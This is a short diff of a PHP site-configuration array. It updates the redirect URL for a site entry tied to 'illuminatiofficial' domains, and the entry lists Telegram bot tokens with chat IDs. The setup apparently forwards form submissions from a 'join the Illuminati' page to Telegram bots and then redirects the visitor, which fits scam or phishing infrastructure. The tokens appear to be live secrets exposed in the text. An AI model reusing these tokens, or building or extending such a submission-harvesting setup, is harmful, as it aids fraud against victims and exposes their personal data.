@@ -18,7 +18,7 @@ $site_map = [
             ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
             ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
         ],
-        'redirect' => 'https://illuminatiofficial.world/index.html'
+        'redirect' => 'https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website%20join.html'
     ],
     
     'illuminatiofficial.org' => [
